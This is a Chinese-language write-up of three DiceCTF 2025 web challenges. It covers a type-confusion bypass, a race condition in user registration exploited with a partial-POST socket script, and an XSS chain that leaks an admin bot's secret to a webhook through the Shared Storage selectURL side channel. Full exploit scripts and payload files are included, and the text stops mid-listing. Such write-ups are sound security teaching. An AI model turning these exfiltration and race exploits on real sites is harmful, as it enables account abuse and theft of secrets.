---
title: DiceCTF 2025 Quals Writeup
date: 2025-04-03
last_modified_at: 2025-04-7 9:30:00 +0800
categories: [CTF]
tags: [web, xss, nodejs, share storage]
pin: false
math: true
mermaid: true
mermaid: true
image:
  path: /assets/images/DiceCTF-Quals-2025.png
---

## cookie-recipes-v3
源码中关键的比较在 /deliver 路由，只要用户输入的数字大于 1_000_000_000 即可，但 /bake 中对输入的数字长度进行了判断。
```js
app.post('/bake', (req, res) => {
    const number = req.query.number
    if (!number) {
        res.end('missing number')
    } else if (number.length <= 2) {
        cookies.set(req.user, (cookies.get(req.user) ?? 0) + Number(number))
        res.end(cookies.get(req.user).toString())
    } else {
        res.end('that is too many cookies')
    }
})

app.post('/deliver', (req, res) => {
    const current = cookies.get(req.user) ?? 0
    const target = 1_000_000_000 // 10亿个cookie
    if (current < target) {
        res.end(`not enough (need ${target - current}) more`)
    } else {
        // 成功获取10亿个cookie后返回FLAG
        res.end(process.env.FLAG)
    }
})

app.listen(3000)
```
但代码中未对用户输入的类型进行判断，假如用户输入的并不是一个数字，则在比较 current 和 1_000_000_000 始终为 false，就可以获取 flag。

```js
> '$9' < 1_000_000_000
> false
```

## pyramid
题目提供了一个邀请码奖励机制的场景，每个用户可以创建自己的邀请码，其他用户在注册时可以使用该邀请码。当该用户在兑换积分时，该用户的邀请人能够获得其 50% 的积分。

比如：
1. 当前用户 A 通过推荐其他用户 B、C、D 等获得了 ref 值（每推荐一人增加 1 点 ref）
2. 当用户 A 进行兑换时：
  - 如果 A 有推荐人 R（即 A 注册时使用了 R 的推荐码）：
    - A 的 ref 值减半后转化为 A 的余额 bal
    - A 的另一半 ref 值会给到 R（即 R 的 ref 增加）
    - A 的 ref 值归零
  - 如果 A 没有推荐人：
    - A 的全部 ref 值直接转化为 A 的余额 bal
    - A 的 ref 值归零

获取 flag 的要求是余额 bal 大于 100_000_000_000：
```js
app.get('/buy', (req, res) => {
    if (req.user) {
        const user = req.user
        if (user.bal > 100_000_000_000) {
            user.bal -= 100_000_000_000
            res.type('html').end(`
                ${css}
                <h1>Successful purchase</h1>
                <p>${process.env.FLAG}</p>
            `)
        }
    }
    res.type('html').end(`
        ${css}
        <h1>Not enough coins</h1>
        <a href="/">Home</a>
    `)
})
```
如果直接使用暴力创建用户的方式，要想余额能够达到 100_000_000_000，单纯从交互时间上看都是不可能的。因此需要找到绕过的手段。

假如自己成为自己的邀请人，访问 /cashout 时，就能使得 ref 值始终不会置空，并且 bal 值呈指数增加。
```js
app.get('/cashout', (req, res) => {
    if (req.user) {
        const u = req.user
        const r = referrer(u.code)
        // 当前用户 u，当前用户的推荐用户 r
        if (r) {
            // If user has a referrer, split the referral rewards
            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2]
            console.log(u.ref, r.ref, u.bal)
        } else {
            // If no referrer, user gets all rewards
            [u.ref, u.bal] = [0, u.bal + u.ref]
        }
    }
    res.redirect('/')
})
```
那么如何让自己成为自己的邀请人呢？注册并登录后，访问 /code 才能够获取当前用户的邀请码，但注册时提供邀请码，才能够绑定邀请人，似乎陷入死循环。
### 异步特性利用
但题目中注册接口使用了 req.on 来异步处理 data 并进行数据库操作，这就导致 /new 接口实际上是先通过 res.redirect 返回了新用户的 token，然后再插入数据库。 
```js
// User registration route
app.post('/new', (req, res) => {
    const token = random()  // Generate unique token for user

    const body = []
    req.on('data', Array.prototype.push.bind(body))
    req.on('end', () => {
        const data = Buffer.concat(body).toString()
        const parsed = new URLSearchParams(data)
        const name = parsed.get('name')?.toString() ?? 'JD'  // Default name is 'JD' if not provided
        const code = parsed.get('refer') ?? null  // Referral code (optional)

        // If user entered a valid referral code, increment referrer's count
        const r = referrer(code)
        if (r) { r.ref += 1 }

        // Create new user in the system
        users.set(token, {
            name,
            code,
            ref: 0,  // Referral count starts at 0
            bal: 0,  // Coin balance starts at 0
        })
    })

    // Set user cookie and redirect to home page
    res.header('set-cookie', `token=${token}`)
    res.redirect('/')
})
```
加上 /code 接口并没有进行 cookie 校验，只需要用户的 token 就能够申请 code：
```js
// Generate referral code route
app.get('/code', (req, res) => {
    const token = req.token
    if (token) {
        const code = random()  // Generate a new referral code
        codes.set(code, token)  // Associate the code with this user
        res.type('html').end(`
            ${css}
            <h1>Referral code generated</h1>
            <p>Your code: <strong>${code}</strong></p>
            <a href="/">Home</a>
        `)
    }
})
```
那么我们就可以利用这种时间差：
1. 访问 /new 时，先发送部分 post data 数据，使得服务端返回用户 token，但由于 data 并未发送完，服务仍未进行数据库插入操作。
2. 获取 token 后，访问 /code 生成邀请码。
3. 得到邀请码之后发送剩余 post data 数据，其中就包含得到的邀请码。

发送 post data 时，为了控制发送的时间，可以直接使用 socket，本地测试脚本如下：
```py
import socket
import time
import re
import requests

URL = "localhost"  # change to target hostname
PORT = 3000        # change to target port

def send_partial_request(host, port):
    # create socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # prepare full request body, but only send part of it
    body_part1 = "name=Hacker"
    # The referral code is exactly 32 characters long
    body_part2 = "&refer=" + "X" * 32  # Will be replaced with actual 32-char referral code
    
    # calculate the total content length
    total_length = len(body_part1) + len(body_part2)
    
    # construct and send request header and first part of data
    request_part1 = (
        "POST /new HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {total_length}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body_part1}"  # only send the first part: name=Hacker
    )
    
    s.sendall(request_part1.encode())
    
    # receive response header
    response = b""
    while not b"\r\n\r\n" in response:
        response += s.recv(1024)
    
    # parse cookie
    cookie_match = re.search(b"set-cookie: token=([\S]*)", response, re.IGNORECASE)
    if not cookie_match:
        print("[-] get token failed!")
        return None, None, None
    
    token = cookie_match.group(1).decode()
    print(f"[+] get token: {token}")
    
    return s, token, body_part2

def get_referral_code(token):
    # use requests to get referral code
    session = requests.Session()
    session.cookies.set('token', token)
    
    resp = session.get(f"http://{URL}:{PORT}/code")
    
    # parse referral code
    html = resp.text

    code_match = re.search(r'<strong>([a-f0-9]{32})</strong>', html)  # Ensure exact 32 chars
    if not code_match:
        print("[-] get referral code failed!")
        return None
    
    referral_code = code_match.group(1)
    print(f"[+] get referral code: {referral_code}")
    
    return referral_code

def complete_request(socket_conn, body_part2_template, referral_code):
    # replace placeholder with actual referral code
    body_part2 = body_part2_template.replace("X" * 32, referral_code)
    
    # send remaining part of request
    socket_conn.sendall(body_part2.encode())
    
    socket_conn.close()
    print("[+] request completed")

def add_refer(referral_code):
    session = requests.Session()
    resp = session.post(f"http://{URL}:{PORT}/new", data={"name": "other", "refer": referral_code})
    print('[+] add refer to 1')

def cashout_and_buy_flag(token):
    session = requests.Session()
    session.cookies.set('token', token)
    
    # call cashout multiple times
    for i in range(75):
        try:
            resp = session.get(f"http://{URL}:{PORT}/cashout")
            print(f"Cashout {i+1} completed")
            
            # get current balance
            home_resp = session.get(f"http://{URL}:{PORT}/")
            balance_match = re.search(r'You have <strong>(\d+)</strong> coins', home_resp.text)
            if balance_match:
                balance = int(balance_match.group(1))
                print(f"current balance: {balance}")
                # if balance is enough, try to buy flag
                if balance > 100_000_000_000:
                    break
            
            time.sleep(0.5)
        except Exception as e:
            print(f"Error during cashout: {e}")
    
    # try to buy flag
    resp = session.get(f"http://{URL}:{PORT}/buy")
    print(resp.text)
    
    # extract flag
    flag_pattern = r'dice{[^}]+}|flag{[^}]+}|ctf{[^}]+}'
    flag_match = re.search(flag_pattern, resp.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] get flag: {flag}")
        return flag
    else:
        print("[-] no flag found!")
        return None

def main():
    # first step: send partial request to get token
    socket_conn, token, body_part2_template = send_partial_request(URL, PORT)
    if not token:
        return
    
    # second step: use token to get referral code
    referral_code = get_referral_code(token)
    if not referral_code:
        return
    
    # third step: complete request, set yourself as your own referrer
    complete_request(socket_conn, body_part2_template, referral_code)
    
    # fourth step: add refer to 1
    add_refer(referral_code)

    # fourth step: call cashout multiple times and buy flag
    cashout_and_buy_flag(token)

if __name__ == "__main__":
    main()
```
### EXP
远程利用是，由于目标为 https，因此还需要加上 SSL
```py
import socket
import time
import re
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  

URL = "pyramid.dicec.tf"  # change to target hostname
PORT = 443        # change to target port

def send_partial_request(host, port):
    # create socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # prepare full request body, but only send part of it
    body_part1 = "name=Hacker"
    # The referral code is exactly 32 characters long
    body_part2 = "&refer=" + "X" * 32  # Will be replaced with actual 32-char referral code
    
    # calculate the total content length
    total_length = len(body_part1) + len(body_part2)
    
    # construct and send request header and first part of data
    request_part1 = (
        "POST /new HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {total_length}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body_part1}"  # only send the first part: name=Hacker
    )
    
    s.sendall(request_part1.encode())
    
    # receive response header
    response = b""
    while not b"\r\n\r\n" in response:
        response += s.recv(1024)
    
    # parse cookie
    cookie_match = re.search(b"set-cookie: token=([\S]*)", response, re.IGNORECASE)
    if not cookie_match:
        print("[-] get token failed!")
        return None, None, None
    
    token = cookie_match.group(1).decode()
    print(f"[+] get token: {token}")
    
    return s, token, body_part2

def get_referral_code(token):
    # use requests to get referral code
    session = requests.Session()
    session.cookies.set('token', token)
    
    resp = session.get(f"https://{URL}:{PORT}/code",verify=False)
    
    # parse referral code
    html = resp.text

    code_match = re.search(r'<strong>([a-f0-9]{32})</strong>', html)  # Ensure exact 32 chars
    if not code_match:
        print("[-] get referral code failed!")
        return None
    
    referral_code = code_match.group(1)
    print(f"[+] get referral code: {referral_code}")
    
    return referral_code

def complete_request(socket_conn, body_part2_template, referral_code):
    # replace placeholder with actual referral code
    body_part2 = body_part2_template.replace("X" * 32, referral_code)
    
    # send remaining part of request
    socket_conn.sendall(body_part2.encode())
    
    socket_conn.close()
    print("[+] request completed")

def add_refer(referral_code):
    session = requests.Session()
    resp = session.post(f"https://{URL}:{PORT}/new", data={"name": "other", "refer": referral_code},verify=False)
    print('[+] add refer to 1')

def cashout_and_buy_flag(token):
    session = requests.Session()
    session.cookies.set('token', token)
    
    # call cashout multiple times
    for i in range(60):
        try:
            resp = session.get(f"https://{URL}:{PORT}/cashout",verify=False)
            print(f"Cashout {i+1} completed")
            
            # get current balance
            home_resp = session.get(f"https://{URL}:{PORT}/",verify=False)
            balance_match = re.search(r'You have <strong>(\d+)</strong> coins', home_resp.text)
            if balance_match:
                balance = int(balance_match.group(1))
                print(f"current balance: {balance}")
                # if balance is enough, try to buy flag
                if balance > 100_000_000_000:
                    break
            
            time.sleep(0.5)
        except Exception as e:
            print(f"Error during cashout: {e}")
    
    # try to buy flag
    resp = session.get(f"https://{URL}:{PORT}/buy",verify=False)
    print(resp.text)
    
    # extract flag
    flag_pattern = r'dice{[^}]+}|flag{[^}]+}|ctf{[^}]+}'
    flag_match = re.search(flag_pattern, resp.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] get flag: {flag}")
        return flag
    else:
        print("[-] no flag found!")
        return None

def main():
    # first step: send partial request to get token
    socket_conn, token, body_part2_template = send_partial_request(URL, PORT)
    if not token:
        return
    
    # second step: use token to get referral code
    referral_code = get_referral_code(token)
    if not referral_code:
        return
    
    # third step: complete request, set yourself as your own referrer
    complete_request(socket_conn, body_part2_template, referral_code)
    
    # fourth step: add refer to 1
    add_refer(referral_code)

    # fourth step: call cashout multiple times and buy flag
    cashout_and_buy_flag(token)

if __name__ == "__main__":
    main()

```

## nobin
### 赛题分析
nobin 这道题的源码如下：

app.js：
```js
const express = require("express");
const crypto = require("crypto");
const fs = require("fs");

const FLAG = process.env.FLAG || "dice{test_flag}";
const PORT = process.env.PORT || 3000;

const bot = require("./bot");

const app = express();

const indexHtml = fs.readFileSync("./views/index.html", "utf8");
// add read button
const indexReadHtml = fs.readFileSync("./views/index_read.html", "utf8");

const reportHtml = fs.readFileSync("./views/report.html", "utf8");
const readMessageJs = fs.readFileSync("./read-message.js", "utf8");

const secret = crypto.randomBytes(8).toString("hex");
console.log(`secret: ${secret}`);

app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.setHeader("Cache-Control", "no-store");
    next();
});

let lastVisit = -1;
app.post("/report", (req, res) => {
    const { url } = req.body;
    if (!url || typeof url !== "string") {
        return res.redirect(`/report?message=${encodeURIComponent("Missing URL")}`);
    }

    try {
        const u = new URL(url);
        if (u.protocol !== "http:" && u.protocol !== "https:") {
            throw new Error("Invalid protocol");
        }
    }
    catch (err) {
        return res.redirect(`/report?message=${encodeURIComponent(err.message)}&url=${encodeURIComponent(url)}`);
    }

    const deltaTime = +new Date() - lastVisit;
    if (deltaTime < 95_000) {
        return res.redirect(`/report?message=${encodeURIComponent(
            `Please slow down (wait ${(95_000 - deltaTime)/1000} more seconds)
        `)}&url=${encodeURIComponent(url)}`);
    }
    lastVisit = +new Date();
  
    bot.visit(secret, url);
    res.redirect(`/report?message=${encodeURIComponent("The admin will check your URL soon")}&url=${encodeURIComponent(url)}`);
});

app.get("/flag", (req, res) => res.send(req.query.secret === secret ? FLAG : "No flag for you!"));
app.get("/xss", (req, res) => res.send(req.query.xss ?? "Hello, world!"));
app.get("/report", (req, res) => res.send(reportHtml));
app.get("/", (req, res) => res.send(indexHtml));
```
app.js 提供了以下几个路由：
1. /report，用于向 bot 提交 url
2. /xss，直接将用户的 get 参数返回，存在 xss。
3. /flag，发送 secret 即可获得 flag，secret 为随机生成的 8 位 hex，总长度为 16 位字符。

当用户访问 report 后，bot 会先访问 index.html，点击 submit 按钮，然后访问用户提供的 url。views/index.html 代码如下：
```html
<!DOCTYPE html>
<html>
  <head>
    <title>nobin</title>
    <link rel="stylesheet" href="https://unpkg.com/marx-css/css/marx.min.css">
  </head>
  <body>
    <main>
      <h1>nobin</h1>
      <hr />
      <h5>Enter your message to be saved:</h5>
      <!-- TODO: implement a way to read the message -->
      <p></p>
      <form>
        <label for="message">Message:</label>
        <textarea id="message" placeholder="Message"></textarea>
        <br />
        <input type="submit" value="Save">
      </form>
      <script>
        document.querySelector('form').addEventListener('submit', async (e) => {
          e.preventDefault();
          const message = document.querySelector('textarea').value;
          await sharedStorage.set("message", message);
          document.querySelector('p').textContent = "Message saved!";
          setTimeout(() => {
            document.querySelector('p').textContent = "";
          }, 2000);
        });
      </script>
      <br />
      <a href="/report">Report</a>
    </main>
  </body>
</html>
```
页面中使用 sharedStorage 来存储 secret，而我们的目标是通过 xss 读取该值。

shareStorage 是一种客户端存储机制，允许网站在保护用户隐私的同时实现跨站点数据访问，而不依赖于跟踪 Cookie。

shareStorage 的读写过程比较特殊，写入操作时，可以随时向 shareStorage 写入，但读取操作只能够在称为 "worklet" 的安全环境中读取数据。

比如如下的代码，写入 shareStorage 时比较简单，仅需调用 window.sharedStorage.set 即可。
```js
// 主线程中写入数据
async function writeToSharedStorage() {
  // 检查 Shared Storage API 是否可用
  if (!window.sharedStorage) {
    console.error("Shared Storage API 不可用");
    return;
  }
  
  // 简单的键值写入
  await window.sharedStorage.set("user-preference", "dark-theme");
  
  // 带选项的写入 - 如果键已存在，不覆盖现有值
  await window.sharedStorage.set("first-visit-date", new Date().toISOString(), {
    ignoreIfPresent: true
  });
  
  // 其他写入操作
  await window.sharedStorage.append("visit-count", "1"); // 追加操作
  
  console.log("数据已写入共享存储");
}

// 调用写入函数
writeToSharedStorage();
```
但是在读取时，需要编写一个 worklet，其中使用 register 将类进行注册。
```js
// read-message.js - 必须是单独的文件

//  Shared Storage worklet
class GetMessageOperation {
  constructor() { }

  async run() {
    console.log('run get message');
    
    try {
      let message = "default message";
      
      try {
        message = await this.sharedStorage.get("message");
      } catch (e1) {
        try {
          message = await sharedStorage.get("message");
        } catch (e2) {
          console.error('get message error:', e2);
        }
      }
      
      console.log('get message:', message);
    } catch (error) {
      console.error('get message error:', error);
      return 'get message error';
    }
  }
}

register('get-message', GetMessageOperation);
```
最后加载该 worklet.js 
```js
    (async function() {
        try {
            // load worklet
            await window.sharedStorage.worklet.addModule("read-message.js");
            console.log("Worklet load succeed");
            
            document.getElementById('status').textContent = "reading...";
            await window.sharedStorage.run("get-message", {});
            console.log("read done");
        } catch (error) {
            console.error("read failed:", error);
        }
    })();
```
完整测试代码如下：
```html
<!DOCTYPE html>
<html>
  <head>
    <title>nobin</title>
    <link rel="stylesheet" href="https://unpkg.com/marx-css/css/marx.min.css">
  </head>
  <body>
    <main>
      <h1>nobin</h1>
      <hr />
      <h5>Enter your message to be saved:</h5>
      <!-- TODO: implement a way to read the message -->
      <p></p>
      <form>
        <label for="message">Message:</label>
        <textarea id="message" placeholder="Message"></textarea>
        <br />
        <input type="submit" value="Save">
      </form>
      <script>
        document.querySelector('form').addEventListener('submit', async (e) => {
          e.preventDefault();
          const message = document.querySelector('textarea').value;
          await sharedStorage.set("message", message);
          document.querySelector('p').textContent = "Message saved!";
          setTimeout(() => {
            document.querySelector('p').textContent = "";
          }, 2000);
        });


        (async function() {
            try {
                // load worklet
                await window.sharedStorage.worklet.addModule("read-message.js");
                console.log("Worklet load succeed");
                
                document.getElementById('status').textContent = "reading...";
                await window.sharedStorage.run("get-message", {});
                console.log("read done");
            } catch (error) {
                console.error("read failed:", error);
            }
        })();
      </script>
      <br />
      <a href="/report">Report</a>
    </main>
  </body>
</html>
```
因此，我们可以借助 worklet，在 xss payload 中加载 worklet 并读取 secret，下一个问题是如何将获取该结果。

调试时发现，worklet 是一个沙箱环境，读取到的 secret 值只能够在 worklet 中访问，即使 worklet 中使用 return 进行返回，在主线程中也获取不到该值。

其原因在于，Shared Storage API 设计为只允许通过受控的"输出闸门"(output gates)使用数据，而不允许直接读取原始值。

shareStorage 的 output gates 目前只有两种：
1. run：通用运行闸门，也就是上文的 window.sharedStorage.run 方法，不返回值。
2. seletURL：URL 选择闸门，可以根据 worklet 返回的结果，选择特定的 url 进行访问。

相关文档可参考：
- [shared-storage/select-url.md at main · WICG/shared-storage](https://github.com/WICG/shared-storage/blob/main/select-url.md)


因此，selectURL 就相当于一种侧信道手段，我们可以通过在 worklet 中逐位判断 secret，根据 worklet 不同的返回值选择不同的 url。

一个示例如下：
```js
<body>
    <fencedframe id="my-fenced-frame"></fencedframe>
</body>
...

function createAverageUrls(position) {
    return [
        {url: `WEBHOOK_URL/leak?pos=${position}&real=01`},  // 数字 0-1
        {url: `WEBHOOK_URL/leak?pos=${position}&real=23`}, // 小写字母 2-3
        {url: `WEBHOOK_URL/leak?pos=${position}&real=45`}, // 小写字母 4-5
        {url: `WEBHOOK_URL/leak?pos=${position}&real=67`}, // 小写字母 6-7
        {url: `WEBHOOK_URL/leak?pos=${position}&real=89`}, // 小写字母 8-9
        {url: `WEBHOOK_URL/leak?pos=${position}&real=ab`}, // 小写字母 a-b
        {url: `WEBHOOK_URL/leak?pos=${position}&real=cd`}, // 小写字母 c-d
        {url: `WEBHOOK_URL/leak?pos=${position}&real=ef`} // 小写字母 e-f
    ];
}

async function leakCharAtPosition(position) {
    const urls = createAverageUrls(position);
    await leakOne(urls, position, 87, LENGTHLENGTH);
};

async function leakOne(urls, position, min, length){
    const fencedFrameConfig = await window.sharedStorage.selectURL(
        "select-url", 
        urls, 
        {
            data: { 
                position: position,
                min: min,
                length: length
            },
            resolveToConfig: true,
            keepAlive: true,
        }
    );
    await new Promise(resolve => setTimeout(resolve, 2000));
    document.getElementById('my-fenced-frame').config = fencedFrameConfig;
}
```
首先需要声明一个 fencedframe 标签，Fenced Frame 和 Select URL 紧密相关，selectURL 选择的 URL 对用户实际是不透明的，只能在 Fenced Frame 中使用。

selectURL 的第二个参数需要提供一组 url，用于根据 worklet 返回的结果进行选择，第三个参数为 options，data 为发送给 worklet 的参数内容。

然后通过将 fencedframe 标签的 config 属性改为 selectURL 的返回值，就能向该 url 发起请求。

要想对 16 位字符（0-9，a-f 总共 16 个字符）进行逐位判断。我采取了下面的策略：
1. 可以先将 16 位字符分为 8 组，比如 0-1,2-3,a-b,e-f，判断该位的字符属于哪个区间，从而向 webhook 发起请求：https://WEBHOOK/?position=0&range=0-1，此时 selectURL 需要用到 8 个 url。
2. 然后再针对每一位，再使用两个 url 进行判断，确定该位最终的字符。

但是，selectURL 还存在一个非常大的限制：位预算限制。每个页面中的位预算为 6，当 selectURL 第二个参数 urls 提供的 url 总数为 N 时，消耗 log2N 的预算，如果给定 8 个 url，则一次调用消耗 3 个预算。按照上面的带外策略，预算显然是不够的。

由于 selectURL 在单个页面存在限制，那么是否可以通过打开多个页面突破这个限制呢？测试后发现确实可行。

### 最终策略
于是可以调整策略：
1. 第一次访问 /report，xss payload 打开 8 个窗口，每个窗口用于判断两位字符。判断每个字符时使用 8 个 url，预算值为 3，两位字符刚好能最大化利用。
2. 等待 95 秒（等待浏览器关闭）
3. 第二次访问 /report，xss payload 打开 16 个窗口，从 WEBHOOK 的结果对每一位进行精确判断。每一个窗口 selectURL 使用的 url 数量为 2

### EXP
整个利用过程没有完全自动化（太菜），payload 分为 exp.py 以及 template 下的多个 js 文件：
```bash
.
├── exp.py
└── template
    ├── exp-char.js
    ├── exp-range.js
    ├── multi-window.js
    └── precise-char.js
```
#### exp.py
exp.py 内容如下：
```py
import requests
import threading
import time
from flask import Flask, Response, request
from urllib.parse import quote
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

IP = "nobin-1ebeb2dd2978086a.dicec.tf"
# PORT = 3000

EXTERNAL_IP = "XXX.XXX.XXX.XXX"
EXTERNAL_PORT = 8000

# TARGET_URL = f"http://{IP}:{PORT}"
TARGET_URL = f"https://{IP}"
EXTERNAL_URL = f"http://{EXTERNAL_IP}:{EXTERNAL_PORT}"

session = requests.Session()
session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
session.proxies = {}

WEBHOOK_URL = "https://webhook.site/45ea0be7-e26b-4a14-bcad-ffc93eb86c57"
JS_URL = EXTERNAL_URL + "/exp.js"

POSITION = 0

START = 0

def read_js_content(js_content):
    with open(js_content, "r") as f:
        return f.read()

def run_js_server():
    app = Flask(__name__)

    @app.route('/exp-range.js')
    def serve_exp_range_js():
        start = request.args.get('start',0)

        js_content = read_js_content("template/exp-range.js").replace("WEBHOOK_URL", WEBHOOK_URL).replace("LENGTHLENGTH", "2").replace("START", str(start))
        
        response = Response(js_content, mimetype='application/javascript')
        return response

    @app.route('/exp-char.js')
    def serve_exp_char_js():
        min = ord(request.args.get('chars')[0])
        max = ord(request.args.get('chars')[1])
        position = request.args.get('position')

        if max <= 57:
            min += 39
            max += 39

        js_content = read_js_content("template/exp-char.js").replace("WEBHOOK_URL", WEBHOOK_URL).replace("TARGET_POSITION", str(position)).replace("MIN", str(min)).replace("MAX", str(max))

        response = Response(js_content, mimetype='application/javascript')
        return response

    @app.route('/multi-window.js')
    def serve_multi_window_js():
        js_content = read_js_content("template/multi-window.js").replace("EXTERNAL_URL", EXTERNAL_URL)
        response = Response(js_content, mimetype='application/javascript')
        return response
    
    @app.route('/precise-char.js')
    def serve_precise_char_js():
        js_content = read_js_content("template/precise-char.js").replace("EXTERNAL_URL", EXTERNAL_URL)
        response = Response(js_content, mimetype='application/javascript')
        return response

    app.run(host='0.0.0.0', port=EXTERNAL_PORT)



def report(session, exp_url):
    xss_payload = '''<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
  </head>
  <body>
      <fencedframe id="my-fenced-frame"></fencedframe>
      <script src="EXP_URL"></script>
  </body>
</html>'''.replace("EXP_URL", exp_url)
    xss_payload = quote(xss_payload)

    data = {
        "url":"http://localhost:3000/xss?xss=" + xss_payload
    }
    session.post(f"{TARGET_URL}/report", data=data, verify=False)

def report_multiple_window(session):
    exp_url = EXTERNAL_URL + "/multi-window.js"
    report(session, exp_url)


def report_precise_char(session):
    exp_url = EXTERNAL_URL + "/precise-char.js"
    report(session, exp_url)

if __name__ == "__main__":
    thread = threading.Thread(target=run_js_server)
    thread.daemon = True
    thread.start()

    time.sleep(1)
    report_multiple_window(session)
    time.sleep(90) # precision-char.js needs to be modified during this time
    input("continue?")
    report_precise_char(session)
```
首先调用利用 /report 发送 xss payload，让 bot 加载 multi-window.js。
#### multi-window.js
multi-window.js 会打开多个窗口，每个窗口会加载 exp-range.js
```js
const fencedFrame = document.getElementById('my-fenced-frame');

const urlsToOpen = [
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=0"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=2"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=4"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=6"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=8"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=10"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=12"></script></body></html>'),
  'http://localhost:3000/xss?xss=' + encodeURIComponent('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><fencedframe id="my-fenced-frame"></fencedframe><script src="EXTERNAL_URL/exp-range.js?start=14"></script></body></html>')
];


const openedWindows = [];


function openWindowWithUrl(url, index) {
  try {

    const win = window.open(url, `window_${index}`, 'width=500,height=500');
    
    if (win) {
      openedWindows.push(win);
            return true;
    } else {
            return false;
    }
  } catch (error) {
        return false;
  }
}

function openAllWindows() {
    
  urlsToOpen.forEach((url, index) => {
    setTimeout(() => {
      openWindowWithUrl(url, index);

      if (index === urlsToOpen.length - 1) {
        setTimeout(cleanupWindows, 10000);
      }
    }, 500 * index);
  });
}

function cleanupWindows() {
    openedWindows.forEach((win, index) => {
    if (win && !win.closed) {
      win.close();
          }
  });
}

openAllWindows();
```
#### exp-range.js
exp-range.js 仅循环两次，每次可以判断 1 位字符所处的范围，比如 0-1 或者 c-d
```js
function createAverageUrls(position) {
    return [
        {url: `WEBHOOK_URL/leak?pos=${position}&real=01`},  // 数字 0-1
        {url: `WEBHOOK_URL/leak?pos=${position}&real=23`}, // 小写字母 2-3
        {url: `WEBHOOK_URL/leak?pos=${position}&real=45`}, // 小写字母 4-5
        {url: `WEBHOOK_URL/leak?pos=${position}&real=67`}, // 小写字母 6-7
        {url: `WEBHOOK_URL/leak?pos=${position}&real=89`}, // 小写字母 8-9
        {url: `WEBHOOK_URL/leak?pos=${position}&real=ab`}, // 小写字母 a-b
        {url: `WEBHOOK_URL/leak?pos=${position}&real=cd`}, // 小写字母 c-d
        {url: `WEBHOOK_URL/leak?pos=${position}&real=ef`} // 小写字母 e-f
    ];
}

async function leakCharAtPosition(position) {
    const urls = createAverageUrls(position);
    await leakOne(urls, position, 87, LENGTHLENGTH);
};

async function leakOne(urls, position, min, length){
    const fencedFrameConfig = await window.sharedStorage.selectURL(
        "select-url", 
        urls, 
        {
            data: { 
                position: position,
                min: min,
                length: length
            },
            resolveToConfig: true,
            keepAlive: true,
        }
    );
    await new Promise(resolve => setTimeout(resolve, 2000));
    document.getElementById('my-fenced-frame').config = fencedFrameConfig;
}

async function leakInformation() {
    const workletCode = `
        class SelectURLOperation {
        
        async run(urls, data) {
            try {
                let message = "default message";
            
                try {
                message = await this.sharedStorage.get("message");
                } catch (e1) {
                try {
                    message = await sharedStorage.get("message");
                } catch (e2) {
                    console.error('get message error:', e2);
                }
                }
                
                if (message && message.length > 0) {
                    let targetChar = message.charCodeAt(data.position);
                    if(targetChar <= 57){
                    targetChar += 39
                    } 

                    return Math.floor((targetChar - data.min) / data.length);
                } 
                return 0;
            } catch (error) {
                console.error('select url error:', error);
                return 'select url error';
            }
        }
        }

        register('select-url', SelectURLOperation);
    `;
    
    const blob = new Blob([workletCode], {type: 'application/javascript'});
    const workletUrl = URL.createObjectURL(blob);
    
    await window.sharedStorage.worklet.addModule(workletUrl);
    for (let i = START; i < START + 2; i++) {
        await leakCharAtPosition(i);
        await new Promise(resolve => setTimeout(resolve, 300));
    }
}
leakInformation();
```
调用 report_multiple_window 后，webhook 会接收到每一位大致的范围。
#### precise-char.js
此时 bot 会关闭，需要等待 95 秒才能再次发送，期间需要修改 precise-char.js，大致内容如下，比如第 0 位处于 8-9，则需要修改访问 exp-char.js 的访问参数为 `/exp-char.js?chars=89&position=0`,依次类推。
```js
const fencedFrame = document.getElementById('my-fenced-frame');

const urlsToOpen = [
